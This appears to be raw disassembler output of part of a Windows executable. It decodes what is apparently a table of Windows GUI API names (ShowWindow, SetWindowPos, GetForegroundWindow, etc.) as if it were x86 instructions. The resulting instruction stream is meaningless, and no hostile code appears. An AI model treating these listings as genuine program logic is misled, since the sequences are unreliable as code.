  412aa2:	outs   dx,BYTE PTR gs:[esi]
  412aa4:	dec    ecx
  412aa5:	outs   dx,BYTE PTR ds:[esi]
  412aa6:	jo     0x412b1d
  412aa8:	je     0x412aee
  412aaa:	gs jae 0x412b18
  412aad:	je     0x412b1e
  412aaf:	jo     0x412ab1
  412ab1:	add    BYTE PTR [ebp+0x73795302],al
  412ab7:	je     0x412b1e
  412ab9:	ins    DWORD PTR es:[edi],dx
  412aba:	push   eax
  412abb:	popa   
  412abc:	jb     0x412b1f
  412abe:	ins    DWORD PTR es:[edi],dx
  412abf:	gs je  0x412b27
  412ac2:	jb     0x412b37
  412ac4:	dec    ecx
  412ac5:	outs   dx,BYTE PTR ds:[esi]
  412ac6:	outs   dx,WORD PTR ds:[esi]
  412ac8:	inc    ecx
  412ac9:	add    BYTE PTR [esi+0x2],cl
  412acc:	push   ebx
  412acd:	gs je  0x412b1d
  412ad0:	outs   dx,BYTE PTR gs:[esi]
  412ad2:	jne    0x412b1d
  412ad4:	je     0x412b3b
  412ad6:	ins    DWORD PTR es:[edi],dx
  412ad7:	dec    ecx
  412ad8:	outs   dx,BYTE PTR ds:[esi]
  412ad9:	outs   dx,WORD PTR ds:[esi]
  412adb:	push   edi
  412adc:	add    BYTE PTR [eax],al
  412ade:	adc    eax,0x6c655202
  412ae3:	gs popa 
  412ae5:	jae    0x412b4c
  412ae7:	inc    esp
  412ae8:	inc    ebx
  412ae9:	add    BYTE PTR [ecx+0x766e4901],cl
  412aef:	popa   
  412af0:	ins    BYTE PTR es:[edi],dx
  412af1:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412af9:	je     0x412afb
  412afb:	add    BYTE PTR [edx+eax*1+0x74697753],al
  412b02:	arpl   WORD PTR [eax+0x54],bp
  412b05:	outs   dx,DWORD PTR ds:[esi]
  412b06:	push   esp
  412b07:	push   0x69577369
  412b0c:	outs   dx,BYTE PTR ds:[esi]
  412b0d:	outs   dx,DWORD PTR fs:[esi]
  412b0f:	ja     0x412b11
  412b11:	add    BYTE PTR [esi+0x6c694b01],ah
  412b17:	ins    BYTE PTR es:[edi],dx
  412b18:	push   esp
  412b19:	imul   ebp,DWORD PTR [ebp+0x65],0x2bd0072
  412b20:	imul   esp,DWORD PTR [ebp+0x79],0x62
  412b24:	fs pop edi
  412b26:	gs jbe 0x412b8e
  412b29:	outs   dx,BYTE PTR ds:[esi]
  412b2a:	je     0x412b2c
  412b2c:	cmp    eax,0x65684300
  412b31:	arpl   WORD PTR [ebx+0x52],bp
  412b34:	popa   
  412b35:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  412b3d:	outs   dx,BYTE PTR ds:[esi]
  412b3e:	add    BYTE PTR [eax],al
  412b40:	sahf   
  412b41:	add    DWORD PTR [ecx+0x73],ecx
  412b44:	push   edx
  412b45:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412b4a:	jo     0x412bc0
  412b4c:	jns    0x412b4e
  412b4e:	mov    es,WORD PTR [ecx]
  412b50:	dec    ecx
  412b51:	jae    0x412b96
  412b53:	push   0x6c417261
  412b58:	jo     0x412bc2
  412b5a:	popa   
  412b5b:	dec    esi
  412b5c:	jne    0x412bcb
  412b5e:	gs jb  0x412bca
  412b61:	arpl   WORD PTR [edi+0x0],dx
  412b64:	mov    ch,0x0
  412b66:	inc    esp
  412b67:	jb     0x412bca
  412b69:	ja     0x412bb8
  412b6b:	outs   dx,BYTE PTR gs:[esi]
  412b6d:	jne    0x412bb1
  412b6f:	popa   
  412b70:	jb     0x412b72
  412b72:	mov    BYTE PTR [edx],al
  412b74:	push   esp
  412b75:	popa   
  412b76:	bound  esp,QWORD PTR [edx+0x65]
  412b79:	fs push esp
  412b7b:	gs js  0x412bf2
  412b7e:	dec    edi
  412b7f:	jne    0x412bf5
  412b81:	push   edi
  412b82:	add    BYTE PTR [eax],al
  412b84:	or     eax,DWORD PTR [ecx]
  412b86:	inc    edi
  412b87:	gs je  0x412bce
  412b8a:	inc    ebx
  412b8b:	inc    ebp
  412b8c:	js     0x412b8e
  412b8e:	jno    0x412b92
  412b90:	push   ebx
  412b91:	gs je  0x412beb
  412b94:	imul   ebp,DWORD PTR [esi+0x64],0x6752776f
  412b9b:	outs   dx,BYTE PTR ds:[esi]
  412b9c:	add    BYTE PTR [eax],al
  412b9e:	xchg   ebx,eax
  412b9f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412ba3:	je     0x412c17
  412ba5:	outs   dx,DWORD PTR ds:[esi]
  412ba6:	jns    0x412be9
  412ba8:	arpl   WORD PTR [ebx+0x65],sp
  412bab:	ins    BYTE PTR es:[edi],dx
  412bac:	gs jb  0x412c10
  412baf:	je     0x412c20
  412bb1:	jb     0x412c07
  412bb3:	popa   
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	push   edi
  412bb9:	add    dl,BYTE PTR [ebx+0x65]
  412bbc:	je     0x412c0e
  412bbe:	jb     0x412c2f
  412bc0:	jo     0x412c19
  412bc2:	add    BYTE PTR [eax],al
  412bc4:	sti    
  412bc5:	add    DWORD PTR [eax+0x74],edx
  412bc8:	dec    ecx
  412bc9:	outs   dx,BYTE PTR ds:[esi]
  412bca:	push   edx
  412bcb:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  412bd0:	push   0x74655302
  412bd5:	push   ebp
  412bd6:	jae    0x412c3d
  412bd8:	jb     0x412c29
  412bda:	bound  ebp,QWORD PTR [edx+0x65]
  412bdd:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  412be1:	outs   dx,WORD PTR ds:[esi]
  412be3:	jb     0x412c52
  412be5:	popa   
  412be6:	je     0x412c51
  412be8:	outs   dx,DWORD PTR ds:[esi]
  412be9:	outs   dx,BYTE PTR ds:[esi]
  412bea:	push   edi
  412beb:	add    dh,ch
  412bed:	add    DWORD PTR [eax+0x65],edx
  412bf0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412bf5:	jae    0x412c58
  412bf7:	addr16 gs inc ecx
  412bfa:	add    BYTE PTR [eax],al
  412bfc:	xor    eax,0x61684300
  412c01:	jb     0x412c57
  412c03:	outs   dx,DWORD PTR ds:[esi]
  412c04:	dec    edi
  412c05:	gs ins DWORD PTR es:[edi],dx
  412c07:	push   edi
  412c08:	add    BYTE PTR [eax],al
  412c0a:	add    BYTE PTR [ecx],0x49
  412c0d:	outs   dx,BYTE PTR ds:[esi]
  412c0e:	data16 ins BYTE PTR es:[edi],dx
  412c10:	popa   
  412c11:	je     0x412c78
  412c13:	push   edx
  412c14:	arpl   WORD PTR gs:[eax+eax*1-0x4d],si
  412c19:	add    BYTE PTR [edx+esi*2+0x61],al
  412c1d:	ja     0x412c68
  412c1f:	arpl   WORD PTR [edi+0x6e],bp
  412c22:	add    BYTE PTR [eax],al
  412c24:	mov    dl,0x0
  412c26:	inc    esp
  412c27:	jb     0x412c8a
  412c29:	ja     0x412c71
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	gs inc ebx
  412c30:	outs   dx,DWORD PTR ds:[esi]
  412c31:	outs   dx,BYTE PTR ds:[esi]
  412c32:	je     0x412ca6
  412c34:	outs   dx,DWORD PTR ds:[esi]
  412c35:	ins    BYTE PTR es:[edi],dx
  412c36:	add    BYTE PTR [eax],al
  412c38:	inc    edx
  412c39:	add    DWORD PTR [edi+0x65],eax
  412c3c:	je     0x412c8c
  412c3e:	gs js  0x412cb5
  412c41:	inc    esp
  412c42:	ins    BYTE PTR es:[edi],dx
  412c43:	addr16 inc edi
  412c45:	jb     0x412cb6
  412c47:	jne    0x412cb9
  412c49:	dec    ecx
  412c4a:	je     0x412cb1
  412c4c:	ins    DWORD PTR es:[edi],dx
  412c4d:	add    BYTE PTR ds:0x6e655302,ah
  412c53:	fs dec ecx
  412c55:	outs   dx,BYTE PTR ds:[esi]
  412c56:	jo     0x412ccd
  412c58:	je     0x412c5a
  412c5a:	mov    DWORD PTR [eax],eax
  412c5c:	inc    esp
  412c5d:	gs inc si
  412c60:	jb     0x412cc3
  412c62:	ins    DWORD PTR es:[edi],dx
  412c63:	gs push eax
  412c65:	jb     0x412cd6
  412c67:	arpl   WORD PTR [ecx+0x0],ax
  412c6a:	mov    es,WORD PTR [eax]
  412c6c:	inc    esp
  412c6d:	gs push di
  412c70:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  412c77:	outs   dx,DWORD PTR ds:[esi]
  412c78:	arpl   WORD PTR [ecx+0x0],ax
  412c7b:	add    BYTE PTR [eax+eax*1+0x6c616944],bl
  412c82:	outs   dx,DWORD PTR ds:[esi]
  412c83:	addr16 inc edx
  412c85:	outs   dx,DWORD PTR ds:[esi]
  412c86:	js     0x412cd8
  412c88:	popa   
  412c89:	jb     0x412cec
  412c8b:	ins    DWORD PTR es:[edi],dx
  412c8c:	inc    ecx
  412c8d:	add    BYTE PTR [edx],al
  412c8f:	add    dl,BYTE PTR [edx+0x65]
  412c92:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  412c9a:	popa   
  412c9b:	jae    0x412d10
  412c9d:	inc    ecx
  412c9e:	add    BYTE PTR [eax],al
  412ca0:	dec    edx
  412ca1:	add    BYTE PTR [ebx+0x6f],al
  412ca4:	jo     0x412d1f
  412ca6:	inc    ecx
  412ca7:	arpl   WORD PTR [ebx+0x65],sp
  412caa:	ins    BYTE PTR es:[edi],dx
  412cab:	gs jb  0x412d0f
  412cae:	je     0x412d1f
  412cb0:	jb     0x412d06
  412cb2:	popa   
  412cb3:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cb7:	add    BYTE PTR [ebx+0x1],bl
  412cba:	inc    edi
  412cbb:	gs je  0x412d11
  412cbe:	jns    0x412d33
  412cc0:	je     0x412d27
  412cc2:	ins    DWORD PTR es:[edi],dx
  412cc3:	dec    ebp
  412cc4:	outs   dx,BYTE PTR gs:[esi]
  412cc6:	jne    0x412cc8
  412cc8:	mov    eax,0x61724400
  412ccd:	ja     0x412d22
  412ccf:	je     0x412d32
  412cd1:	je     0x412d38
  412cd3:	push   edi
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	loope  0x412cd8
  412cd8:	inc    esi
  412cd9:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  412ce0:	outs   dx,DWORD PTR ds:[esi]
  412ce1:	ja     0x412d24
  412ce3:	add    BYTE PTR [edx+0x0],ah
  412ce6:	inc    ebx
  412ce7:	jb     0x412d4e
  412ce9:	popa   
  412cea:	je     0x412d51
  412cec:	push   edi
  412ced:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412cf4:	inc    ecx
  412cf5:	add    cl,al
  412cf7:	add    BYTE PTR [ebp+0x6e],al
  412cfa:	popa   
  412cfb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cff:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412d06:	cmp    DWORD PTR [eax],eax
  412d08:	inc    ebx
  412d09:	push   0x70557261
  412d0e:	jo     0x412d75
  412d10:	jb     0x412d69
  412d12:	add    BYTE PTR [eax],al
  412d14:	or     al,BYTE PTR [edx]
  412d16:	push   edx
  412d17:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f487265
  412d20:	je     0x412d6d
  412d22:	gs jns 0x412d25
  412d25:	add    BYTE PTR [ebx],al
  412d27:	add    BYTE PTR [ecx+0x64],al
  412d2a:	push   0x75
  412d2c:	jae    0x412da2
  412d2e:	push   edi
  412d2f:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412d36:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412d3a:	add    BYTE PTR [eax],al
  412d3c:	aad    0x1
  412d3e:	dec    ebp
  412d3f:	gs jae 0x412db5
  412d42:	popa   
  412d43:	addr16 gs inc edx
  412d46:	outs   dx,DWORD PTR ds:[esi]
  412d47:	js     0x412da0
  412d49:	add    bh,cl
  412d4b:	add    DWORD PTR [ebp+0x65],ecx
  412d4e:	jae    0x412dc3
  412d50:	popa   
  412d51:	addr16 gs inc edx
  412d54:	outs   dx,DWORD PTR ds:[esi]
  412d55:	js     0x412d9c
  412d57:	js     0x412d9a
  412d59:	add    BYTE PTR [edx+0x1],ah
  412d5c:	inc    edi
  412d5d:	gs je  0x412db4
  412d60:	outs   dx,DWORD PTR ds:[esi]
  412d61:	jo     0x412dba
  412d63:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412d6a:	dec    eax
  412d6b:	add    dl,BYTE PTR [ebx+0x65]
  412d6e:	je     0x412dbd
  412d70:	outs   dx,BYTE PTR gs:[esi]
  412d72:	jne    0x412d74
  412d74:	loop   0x412d76
  412d76:	inc    esi
  412d77:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  412d7e:	outs   dx,DWORD PTR ds:[esi]
  412d7f:	ja     0x412dc6
  412d81:	js     0x412dc4
  412d83:	add    BYTE PTR [esi+0x616f4c01],dh
  412d89:	fs dec ebp
  412d8b:	outs   dx,BYTE PTR gs:[esi]
  412d8d:	jne    0x412dd0
  412d8f:	add    dh,cl
  412d91:	add    DWORD PTR [ebp+0x65],ecx
  412d94:	jae    0x412e09
  412d96:	popa   
  412d97:	addr16 gs inc edx
  412d9a:	outs   dx,DWORD PTR ds:[esi]
  412d9b:	js     0x412dde
  412d9d:	add    ch,bl
  412d9f:	add    BYTE PTR [ebp+0x71],al
  412da2:	jne    0x412e05
  412da4:	ins    BYTE PTR es:[edi],dx
  412da5:	push   edx
  412da6:	arpl   WORD PTR gs:[eax+eax*1-0x72],si
  412dab:	add    dl,BYTE PTR [edi+ebp*2+0x55]
  412daf:	outs   dx,BYTE PTR ds:[esi]
  412db0:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412db7:	add    BYTE PTR [edi+0x1],dh
  412dba:	inc    edi
  412dbb:	gs je  0x412e15
  412dbe:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  412dc5:	js     0x412e3b
  412dc7:	dec    esp
  412dc8:	outs   dx,BYTE PTR gs:[esi]
  412dca:	addr16 je 0x412e35
  412dcd:	push   edi
  412dce:	add    BYTE PTR [eax],al
  412dd0:	mov    al,BYTE PTR [edx]
  412dd2:	push   esp
  412dd3:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  412ddb:	ja     0x412e50
  412ddd:	add    dh,bh
  412ddf:	add    BYTE PTR [edi+0x65],al
  412de2:	je     0x412e27
  412de4:	ins    BYTE PTR es:[edi],dx
  412de5:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412dec:	jb     0x412dee
  412dee:	les    eax,FWORD PTR [ecx]
  412df0:	dec    ebp
  412df1:	popa   
  412df2:	jo     0x412e38
  412df4:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  412dfb:	arpl   WORD PTR [eax+eax*1-0x45],si
  412dff:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412e03:	fs push ebx
  412e05:	je     0x412e79
  412e07:	imul   ebp,DWORD PTR [esi+0x67],0x17e0041
  412e0e:	dec    eax
  412e0f:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  412e17:	jne    0x412e62
  412e19:	je     0x412e80
  412e1b:	ins    DWORD PTR es:[edi],dx
  412e1c:	add    BYTE PTR [eax],al
  412e1e:	xor    al,BYTE PTR [ecx]
  412e20:	inc    edi
  412e21:	gs je  0x412e71
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	jne    0x412e71
  412e28:	je     0x412e8f
  412e2a:	ins    DWORD PTR es:[edi],dx
  412e2b:	inc    ebx
  412e2c:	outs   dx,DWORD PTR ds:[esi]
  412e2d:	jne    0x412e9d
  412e2f:	je     0x412e31
  412e31:	add    cl,al
  412e33:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  412e37:	imul   esi,DWORD PTR [ebp+0x70],0x49
  412e3b:	arpl   WORD PTR [edi+0x6e],bp
  412e3e:	dec    ecx
  412e3f:	fs inc esi
  412e41:	jb     0x412eb2
  412e43:	ins    DWORD PTR es:[edi],dx
  412e44:	inc    esp
  412e45:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  412e4c:	jns    0x412e4e
  412e4e:	mov    BYTE PTR [ecx],al
  412e50:	dec    ecx
  412e51:	outs   dx,BYTE PTR ds:[esi]
  412e52:	je     0x412eb9
  412e54:	jb     0x412ec9
  412e56:	arpl   WORD PTR gs:[edx+edx*2+0x65],si
  412e5b:	arpl   WORD PTR [eax+eax*1+0x13],si
  412e5f:	add    DWORD PTR [edi+0x65],eax
  412e62:	je     0x412ea8
  412e64:	outs   dx,DWORD PTR ds:[esi]
  412e65:	jne    0x412ec9
  412e67:	ins    BYTE PTR es:[edi],dx
  412e68:	gs inc ebx
  412e6a:	ins    BYTE PTR es:[edi],dx
  412e6b:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412e72:	add    BYTE PTR [eax],al
  412e74:	daa    
  412e75:	add    DWORD PTR [edi+0x65],eax
  412e78:	je     0x412ec5
  412e7a:	gs jns 0x412edf
  412e7d:	outs   dx,DWORD PTR ds:[esi]
  412e7e:	popa   
  412e7f:	jb     0x412ee5
  412e81:	push   esp
  412e82:	jns    0x412ef4
  412e84:	gs add al,dh
  412e87:	add    BYTE PTR [edi+0x65],al
  412e8a:	je     0x412ecd
  412e8c:	jae    0x412f07
  412e8e:	outs   dx,BYTE PTR ds:[esi]
  412e8f:	arpl   WORD PTR [ebx+0x65],cx
  412e92:	jns    0x412ee7
  412e94:	je     0x412ef7
  412e96:	je     0x412efd
  412e98:	add    BYTE PTR [eax],al
  412e9a:	sub    BYTE PTR [eax],al
  412e9c:	inc    ebx
  412e9d:	push   0x6f4c7261
  412ea2:	ja     0x412f09
  412ea4:	jb     0x412ee8
  412ea6:	jne    0x412f0e
  412ea8:	push   di
  412eaa:	add    BYTE PTR [eax],al
  412eac:	popf   
  412ead:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412eb1:	ins    BYTE PTR es:[edi],dx
  412eb2:	outs   dx,DWORD PTR ds:[esi]
  412eb3:	addr16 inc edx
  412eb5:	outs   dx,DWORD PTR ds:[esi]
  412eb6:	js     0x412f08
  412eb8:	popa   
  412eb9:	jb     0x412f1c
  412ebb:	ins    DWORD PTR es:[edi],dx
  412ebc:	push   edi
  412ebd:	add    BYTE PTR [ecx],ch
  412ebf:	add    BYTE PTR [ebx+0x68],al
  412ec2:	popa   
  412ec3:	jb     0x412f11
  412ec5:	outs   dx,DWORD PTR ds:[esi]
  412ec6:	ja     0x412f2d
  412ec8:	jb     0x412f21
  412eca:	add    BYTE PTR [eax],al
  412ecc:	and    al,0x0
  412ece:	inc    ebx
  412ecf:	push   0x65676e61
  412ed4:	dec    ebp
  412ed5:	outs   dx,BYTE PTR gs:[esi]
  412ed7:	jne    0x412f30
  412ed9:	add    BYTE PTR [edi+0x636f4c01],bh
  412edf:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412ee3:	outs   dx,DWORD PTR fs:[esi]
  412ee5:	ja     0x412f3c
  412ee7:	jo     0x412f4d
  412ee9:	popa   
  412eea:	je     0x412f51
  412eec:	add    BYTE PTR [eax],al
  412eee:	mov    al,ds:0x57734901
  412ef3:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412efa:	mov    DWORD PTR [ecx],0x5670614d
  412f00:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  412f07:	gs jns 0x412f4f
  412f0a:	js     0x412f63
  412f0c:	add    BYTE PTR [eax],al
  412f0e:	pop    ecx
  412f0f:	add    dl,BYTE PTR [ebx+0x65]
  412f12:	je     0x412f66
  412f14:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412f19:	jo     0x412f8f
  412f1b:	jns    0x412f1d
  412f1d:	add    al,bh
  412f1f:	add    BYTE PTR [edi+0x65],al
  412f22:	je     0x412f67
  412f24:	ins    BYTE PTR es:[edi],dx
  412f25:	popa   
  412f26:	jae    0x412f9b
  412f28:	dec    esp
  412f29:	outs   dx,DWORD PTR ds:[esi]
  412f2a:	outs   dx,BYTE PTR ds:[esi]
  412f2b:	addr16 inc ecx
  412f2d:	add    cl,cl
  412f2f:	add    DWORD PTR [ebp+0x61],ecx
  412f32:	jo     0x412f8b
  412f34:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412f3b:	imul   ebp,DWORD PTR [esi+0x74],0x2930073
  412f42:	push   esp
  412f43:	jb     0x412fa6
  412f45:	outs   dx,BYTE PTR ds:[esi]
  412f46:	jae    0x412fb4
  412f48:	popa   
  412f49:	je     0x412fb0
  412f4b:	inc    ecx
  412f4c:	arpl   WORD PTR [ebx+0x65],sp
  412f4f:	ins    BYTE PTR es:[edi],dx
  412f50:	gs jb  0x412fb4
  412f53:	je     0x412fc4
  412f55:	jb     0x412f98
  412f57:	add    BYTE PTR [eax+eax*1],bh
  412f5a:	inc    ebx
  412f5b:	push   0x4d6b6365
  412f60:	outs   dx,BYTE PTR gs:[esi]
  412f62:	jne    0x412fb6
  412f64:	popa   
  412f65:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  412f6d:	add    BYTE PTR [edx+0x2],bl
  412f70:	push   ebx
  412f71:	gs je  0x412fc7
  412f74:	arpl   WORD PTR [edx+0x6f],si
  412f77:	ins    BYTE PTR es:[edi],dx
  412f78:	ins    BYTE PTR es:[edi],dx
  412f79:	dec    ecx
  412f7a:	outs   dx,BYTE PTR ds:[esi]
  412f7b:	outs   dx,WORD PTR ds:[esi]
  412f7d:	add    BYTE PTR ds:0x6c6c4100,al
  412f83:	outs   dx,DWORD PTR ds:[esi]
  412f84:	ja     0x412fd9
  412f86:	gs je  0x412fcf
  412f89:	outs   dx,DWORD PTR ds:[esi]
  412f8a:	jb     0x412ff1
  412f8c:	addr16 jb 0x412ffe
  412f8f:	jne    0x412fff
  412f91:	fs push edi
  412f93:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412f9a:	lahf   
  412f9b:	add    BYTE PTR [ecx+ebp*2+0x73],al
  412f9f:	jo     0x413002
  412fa1:	je     0x413006
  412fa3:	push   0x7373654d
  412fa8:	popa   
  412fa9:	addr16 gs inc ecx
  412fac:	add    BYTE PTR [eax],al
  412fae:	sub    eax,0x61684300
  412fb3:	jb     0x413003
  412fb5:	gs js  0x41302c
  412fb8:	push   edi
  412fb9:	add    bh,ah
  412fbb:	add    BYTE PTR [esi+0x72],al
  412fbe:	popa   
  412fbf:	ins    DWORD PTR es:[edi],dx
  412fc0:	gs push edx
  412fc2:	arpl   WORD PTR gs:[eax+eax*1-0x1c],si
  412fc7:	add    DWORD PTR [edi+0x66],ecx
  412fca:	data16 jae 0x413032
  412fcd:	je     0x413021
  412fcf:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  412fd4:	mov    al,BYTE PTR [ecx]
  412fd6:	dec    ecx
  412fd7:	outs   dx,BYTE PTR ds:[esi]
  412fd8:	jbe    0x41303b
  412fda:	ins    BYTE PTR es:[edi],dx
  412fdb:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x6e675265
  412fe3:	add    BYTE PTR [edx+0x2],al
  412fe6:	push   ebx
  412fe7:	gs je  0x413030
  412fea:	outs   dx,DWORD PTR ds:[esi]
  412feb:	jb     0x413052
  412fed:	addr16 jb 0x41305f
  412ff0:	jne    0x413060
  412ff2:	fs push edi
  412ff4:	imul   ebp,DWORD PTR [esi+0x64],0x2f00776f
  412ffb:	add    dl,BYTE PTR [ebx+0x65]
  412ffe:	je     0x413041
  413000:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  413004:	gs push edi
  413006:	imul   ebp,DWORD PTR [esi+0x64],0x9400776f
  41300d:	add    DWORD PTR [ecx+0x73],ecx
  413010:	inc    ebx
  413011:	push   0x646c69
  413016:	fwait
  413017:	add    dl,BYTE PTR [ebp+0x6e]
  41301a:	ins    BYTE PTR es:[edi],dx
  41301b:	outs   dx,DWORD PTR ds:[esi]
  41301c:	popa   
  41301d:	fs dec ebx
  41301f:	gs jns 0x413084
  413022:	outs   dx,DWORD PTR ds:[esi]
  413023:	popa   
  413024:	jb     0x41308a
  413026:	dec    esp
  413027:	popa   
  413028:	jns    0x413099
  41302a:	jne    0x4130a0
  41302c:	add    BYTE PTR [eax],al
  41302e:	pushf  
  41302f:	add    DWORD PTR [ecx+0x73],ecx
  413032:	dec    ecx
  413033:	arpl   WORD PTR [edi+0x6e],bp
  413036:	imul   esp,DWORD PTR [ebx+0x0],0x47013800
  41303d:	gs je  0x41308d
  413040:	outs   dx,BYTE PTR gs:[esi]
  413042:	jne    0x413097
  413044:	je     0x4130b8
  413046:	imul   ebp,DWORD PTR [esi+0x67],0xb9000041
  41304d:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  413051:	fs dec ebp
  413053:	outs   dx,BYTE PTR gs:[esi]
  413055:	jne    0x4130ae
  413057:	add    BYTE PTR [ebx],dl
  413059:	add    dl,BYTE PTR [edx+0x65]
  41305c:	imul   esi,DWORD PTR [bp+di+0x74],0x69577265
  413064:	outs   dx,BYTE PTR ds:[esi]
  413065:	outs   dx,DWORD PTR fs:[esi]
  413067:	ja     0x4130b6
  413069:	gs jae 0x4130df
  41306c:	popa   
  41306d:	addr16 gs push edi
  413070:	add    BYTE PTR [eax],al
  413072:	cmp    BYTE PTR [edx],al
  413074:	push   ebx
  413075:	gs je  0x4130bb
  413078:	jne    0x4130ec
  41307a:	jae    0x4130eb
  41307c:	jb     0x41307e
  41307e:	add    DWORD PTR ds:[edi+0x65],eax
  413082:	je     0x4130d1
  413084:	gs jae 0x4130fa
  413087:	popa   
  413088:	addr16 gs push edi
  41308b:	add    BYTE PTR ds:0x74654701,dl
  413091:	inc    esi
  413092:	outs   dx,DWORD PTR ds:[esi]
  413093:	jb     0x4130fa
  413095:	addr16 jb 0x413107
  413098:	jne    0x413108
  41309a:	fs push edi
  41309c:	imul   ebp,DWORD PTR [esi+0x64],0x5900776f
  4130a3:	add    BYTE PTR [ebx+0x72],al
  4130a6:	gs popa 
  4130a8:	je     0x41310f
  4130aa:	inc    esp
  4130ab:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  4130b2:	jb     0x413115
  4130b4:	ins    DWORD PTR es:[edi],dx
  4130b5:	push   edi
  4130b6:	add    BYTE PTR [eax],al
  4130b8:	stc    
  4130b9:	add    BYTE PTR [edi+0x65],al
  4130bc:	je     0x413101
  4130be:	ins    BYTE PTR es:[edi],dx
  4130bf:	popa   
  4130c0:	jae    0x413135
  4130c2:	dec    esp
  4130c3:	outs   dx,DWORD PTR ds:[esi]
  4130c4:	outs   dx,BYTE PTR ds:[esi]
  4130c5:	addr16 push edi
  4130c7:	add    BYTE PTR [ebp+0x53],dl
  4130ca:	inc    ebp
  4130cb:	push   edx
  4130cc:	xor    esi,DWORD PTR [edx]
  4130ce:	cs fs ins BYTE PTR es:[edi],dx
  4130d1:	ins    BYTE PTR es:[edi],dx
  4130d2:	add    BYTE PTR [eax],al
  4130d4:	mov    ah,0x3
  4130d6:	push   edx
  4130d7:	gs ins DWORD PTR es:[edi],dx
  4130d9:	outs   dx,DWORD PTR ds:[esi]
  4130da:	jbe    0x413141
  4130dc:	inc    esp
  4130dd:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4130e4:	jns    0x41313d
  4130e6:	add    BYTE PTR [eax],al
  4130e8:	add    al,0x3
  4130ea:	dec    esp
  4130eb:	gs popa 
  4130ed:	jbe    0x413154
  4130ef:	inc    ebx
  4130f0:	jb     0x41315b
  4130f2:	je     0x41315d
  4130f4:	arpl   WORD PTR [ecx+0x6c],sp
  4130f7:	push   ebx
  4130f8:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4130fd:	outs   dx,BYTE PTR ds:[esi]
  4130fe:	add    BYTE PTR [eax],al
  413100:	pop    ss
  413101:	add    al,0x53
  413103:	gs je  0x41314c
  413106:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  41310e:	bound  esi,QWORD PTR [ebp+0x74]
  413111:	gs jae 0x41316b
  413114:	add    BYTE PTR [eax],al
  413116:	xchg   BYTE PTR [esi+edx*2],al
  413119:	imul   esi,DWORD PTR [edx+0x74],0x516c6175
  413120:	jne    0x413187
  413122:	jb     0x41319d
  413124:	add    BYTE PTR [eax],al
  413126:	mov    ds:0x61654802,eax
  41312b:	jo     0x413170
  41312d:	jb     0x413194
  41312f:	popa   
  413130:	je     0x413197
  413132:	add    BYTE PTR [eax],al
  413134:	or     BYTE PTR [ebx+edx*2],al
  413137:	gs je  0x41317d
  41313a:	jne    0x4131ae
  41313c:	jb     0x4131a3
  41313e:	outs   dx,BYTE PTR ds:[esi]
  41313f:	je     0x413185
  413141:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  413148:	jns    0x41318b
  41314a:	add    BYTE PTR [eax],al
  41314c:	cmp    BYTE PTR [ebx],al
  41314e:	dec    edi
  41314f:	jo     0x4131b6
  413151:	outs   dx,BYTE PTR ds:[esi]
  413152:	inc    ebp
  413153:	jbe    0x4131ba
  413155:	outs   dx,BYTE PTR ds:[esi]
  413156:	je     0x413199
  413158:	add    BYTE PTR [eax],al
  41315a:	dec    ebp
  41315b:	add    eax,0x7274736c
  413160:	ins    BYTE PTR es:[edi],dx
  413161:	outs   dx,BYTE PTR gs:[esi]
  413163:	inc    ecx
  413164:	add    BYTE PTR [eax],al
  413166:	add    al,BYTE PTR [bx+0x65]
  41316a:	je     0x4131c0
  41316c:	push   0x64616572
  413171:	dec    esp
  413172:	outs   dx,DWORD PTR ds:[esi]
  413173:	arpl   WORD PTR [ecx+0x6c],sp
  413176:	add    BYTE PTR gs:[ebx+0x4],ch
